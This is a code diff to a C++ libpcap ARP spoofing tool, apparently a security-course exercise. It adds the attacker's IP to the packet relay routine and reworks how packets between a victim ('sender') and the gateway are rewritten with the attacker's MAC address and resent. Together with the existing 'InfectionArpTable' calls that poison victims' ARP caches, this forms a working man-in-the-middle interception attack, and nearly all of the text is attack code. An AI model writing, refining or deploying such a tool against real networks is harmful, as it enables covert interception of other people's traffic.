@@ -140,12 +140,13 @@ void InfectionArpTable(pcap_t* handle, Mac sender_mac, Mac attacker_mac, uint32_
 	}
 }
 
-int RelayPacketAndDetect(pcap_t* handle, Mac MacBuffer[][2], uint32_t IpBuffer[][2], Mac attacker_mac, int size){
+int RelayPacketAndDetect(pcap_t* handle, Mac MacBuffer[][2], uint32_t IpBuffer[][2], Mac attacker_mac, uint32_t attacker_ip, int size){
 	while(true){
 		struct pcap_pkthdr* header;
 		const u_char* getpacket;
 		int count=0;
 		int flag=0;
+		int order=0;
 		int res = pcap_next_ex(handle, &header, &getpacket);
 		if (res == 0) continue;
 		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
@@ -155,8 +156,42 @@ int RelayPacketAndDetect(pcap_t* handle, Mac MacBuffer[][2], uint32_t IpBuffer[]
 		PEthHdr eth_hdr = (PEthHdr)getpacket;
 		PIPHeader ip_hdr = (PIPHeader)(getpacket+sizeof(EthHdr));
 		if(eth_hdr->type()==EthHdr::Ip4){ //ipv4 check
+			order = 0;
 			while(true){
-				if(eth_hdr->smac()== MacBuffer[count][0] && ntohl((uint32_t)ip_hdr->destinationAddress)==IpBuffer[count][1]){
+				if(eth_hdr->smac()== MacBuffer[count][0] && ntohl((uint32_t)ip_hdr->destinationAddress)==IpBuffer[count][1] && ntohl((uint32_t)ip_hdr->sourceAddress)==IpBuffer[count][0]){
+					order=1;
+					eth_hdr->smac_ = attacker_mac;
+					eth_hdr->dmac_ = MacBuffer[count][1];
+					int res1 = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(getpacket), ntohs(ip_hdr->totalLength) + sizeof(EthHdr));
+					if (res1 != 0) {
+						fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res1, pcap_geterr(handle));
+					}
+					count=0;
+					break;
+				}
+				else{
+					count++;
+					if(count>=size){
+						count=0;
+						break;
+					}
+				}
+			}
+			while(true){
+				if(order==1){
+					break;
+				}
+				else if(ntohl((uint32_t)ip_hdr->sourceAddress)== IpBuffer[count][0] && ntohl((uint32_t)ip_hdr->destinationAddress)!=attacker_ip){ //When sender send to target(gateway)
+					eth_hdr->smac_ = attacker_mac;
+					eth_hdr->dmac_ = MacBuffer[count][1];
+					int res1 = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(getpacket), ntohs(ip_hdr->totalLength) + sizeof(EthHdr));
+					if (res1 != 0) {
+						fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res1, pcap_geterr(handle));
+					}
+					count=0;
+					break;
+				}
+				else if(ntohl((uint32_t)ip_hdr->destinationAddress) == IpBuffer[count][1]){ //When sender(gateway) send to target
 					eth_hdr->smac_ = attacker_mac;
 					eth_hdr->dmac_ = MacBuffer[count][1];
 					int res1 = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(getpacket), ntohs(ip_hdr->totalLength) + sizeof(EthHdr));
@@ -214,7 +249,10 @@ int main(int argc, char* argv[]) {
 	//1. Attacker's IP address
 	bool flag = 0;
 	char attacker_ip[20];
+	uint32_t attackerIp;
 	flag = AttackerIp(dev, attacker_ip);
+	attackerIp = (uint32_t)Ip(attacker_ip);
+	printf("%u\n",attackerIp);
 	if(flag==1)	return -1;
 
 	//2. Attacker's MAC address
@@ -257,7 +295,7 @@ int main(int argc, char* argv[]) {
 	//5. Maintain status & relay
 	while(true)
 	{
-		flag = RelayPacketAndDetect(handle, MacBuffer, IpBuffer, attacker_mac, size);
+		flag = RelayPacketAndDetect(handle, MacBuffer, IpBuffer, attacker_mac, attackerIp, size);
 		if(flag%2==1){ //ARP Request's owner is gateway
 			for(int i=0; i<count; i++){
 			InfectionArpTable(handle, MacBuffer[i][0], attacker_mac, IpBuffer[i][0], IpBuffer[i][1]); //infection sender
